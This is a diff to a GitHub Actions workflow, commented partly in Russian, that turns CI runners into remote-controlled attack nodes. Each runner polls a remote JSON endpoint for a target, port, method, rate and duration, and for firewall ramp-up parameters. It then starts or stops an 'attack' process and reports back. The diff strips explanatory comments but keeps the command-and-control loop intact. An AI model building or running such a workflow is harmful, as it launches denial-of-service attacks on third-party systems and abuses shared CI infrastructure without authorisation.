@@ -56,13 +56,11 @@ jobs:
           RUNNER_ID: "runner${{ matrix.runner_id }}"
         run: |
           echo "=== Runner $RUNNER_ID запущен ==="
-          echo "Polling: $JSON_URL"
 
           CURRENT_PID=0
           CURRENT_PARAMS=""
 
           while true; do
-            # Получение JSON
             if ! JSON=$(curl -s -m 6 "$JSON_URL"); then
               echo "[-] Failed to fetch JSON"
               sleep 2
@@ -78,7 +76,6 @@ jobs:
             RATE=$(echo "$JSON" | jq -r '.rate // "0"')
             OPEN_LOOP=$(echo "$JSON" | jq -r '.open_loop // "false"')
 
-            # Firewall parameters
             FW_MAX_PPS=$(echo "$JSON" | jq -r '.fw_max_pps // "5000"')
             FW_START_PPS=$(echo "$JSON" | jq -r '.fw_start_pps // "50"')
             FW_STEP_UP=$(echo "$JSON" | jq -r '.fw_step_up // "150"')
@@ -87,7 +84,6 @@ jobs:
 
             NEW_PARAMS="${METHOD}|${TARGET}|${PORT}|${CONNECTIONS}|${DURATION}|${RATE}"
 
-            # Управление атакой
             if [[ "$COMMAND" == "stop" || "$COMMAND" == "idle" ]]; then
               if [ $CURRENT_PID -ne 0 ]; then
                 echo "[+] [$RUNNER_ID] Остановка атаки"
@@ -142,7 +138,7 @@ jobs:
               echo "[+] [$RUNNER_ID] Атака запущена (PID: $CURRENT_PID)"
             fi
 
-            # Логирование (только runner1)
+            # Логи только от runner1
             if [ "$RUNNER_ID" = "runner1" ] && [ $CURRENT_PID -ne 0 ]; then
               LOG_DATA='{
   "runner": "'$RUNNER_ID'",
